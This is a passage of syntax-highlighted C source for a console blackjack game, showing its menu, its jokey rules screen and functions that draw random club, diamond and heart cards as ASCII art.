class="token punctuation">;</span>     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"\n%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>    <span class="token punctuation">{</span>                                                                                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If yes, continue. Prints menu.</span>    <span class="token punctuation">{</span>             <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter 1 to Begin the Greatest Game Ever Played."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter 2 to See a Complete Listing of Rules."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter 3 to Exit Game. (Not Recommended)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nChoice: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Prompts user for choice</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice2<span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice2<span class="token operator">></span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>            <span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nIncorrect Choice. Please enter 1, 2 or 3\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice2<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">switch</span><span class="token punctuation">(</span>choice2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Switch case for different choices</span>            <span class="token punctuation">{</span>                   <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">// Case to begin game</span>                   <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">// Case to see rules</span>                   <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">rules</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">// Case to exit game</span>                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYour day could have been perfect."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nHave an almost perfect day!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">default</span><span class="token punctuation">:</span>                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nInvalid Input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End switch case</span>    <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End if loop</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If no, exit program</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYour day could have been perfect."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nHave an almost perfect day!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End function</span><span class="token keyword">void</span> <span class="token function">rules</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Prints "Rules of Vlad's Blackjack" list</span><span class="token punctuation">{</span>     <span class="token keyword">char</span> choice1<span class="token punctuation">;</span>     <span class="token keyword">int</span> choice2<span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n           RULES of VLAD's BLACKJACK"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n          ---------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nI."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     Thou shalt not question the odds of this game."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c This program generates cards at random."</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c If you keep losing, you are very unlucky!\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nII."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     Each card has a value."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c Number cards 1 to 10 hold a value of their number."</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c J, Q, and K cards hold a value of 10."</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c Ace cards hold a value of 11"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     The goal of this game is to reach a card value total of 21.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nIII."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     After the dealing of the first two cards, YOU must decide whether to HIT or STAY."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c Staying will keep you safe, hitting will add a card."</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     Because you are competing against the dealer, you must beat his hand."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     BUT BEWARE!."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c If your total goes over 21, you will LOSE!."</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     But the world is not over, because you can always play again.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c%c%c YOUR RESULTS ARE RECORDED AND FOUND IN SAME FOLDER AS PROGRAM %c%c%c\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWould you like to go the previous screen? (I will not take NO for an answer)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                  (Y/N)\n                    "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"\n%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>    <span class="token punctuation">{</span>                                                                                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If yes, continue. Prints menu.</span>    <span class="token punctuation">{</span>             <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End if loop</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If no, convinces user to enter yes</span>    <span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                 I told you so.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End function</span><span class="token keyword">int</span> <span class="token function">clubcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Displays Club Card Image</span><span class="token punctuation">{</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>    k<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 9 or less, print card with that number</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Club Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  %d  |\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 10, print card with J (Jack) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Club Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  J  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11, print card with A (Ace) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Club Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  A  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is Ace, change value to 11 or 1 depending on dealer total</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 12, print card with Q (Queen) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Club Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  Q  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 13, print card with K (King) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Club Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  K  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span>           <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// End function</span><span class="token keyword">int</span> <span class="token function">diamondcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Displays Diamond Card Image</span><span class="token punctuation">{</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>    k<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 9 or less, print card with that number</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Diamond Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  %d  |\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 10, print card with J (Jack) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Diamond Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  J  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11, print card with A (Ace) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Diamond Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  A  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is Ace, change value to 11 or 1 depending on dealer total</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 12, print card with Q (Queen) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Diamond Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  Q  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 13, print card with K (King) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Diamond Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  K  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// End function</span><span class="token keyword">int</span> <span class="token function">heartcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Displays Heart Card Image</span><span class="token punctuation">{</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>    k<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 9 or less, print card with that number</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Heart Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  %d  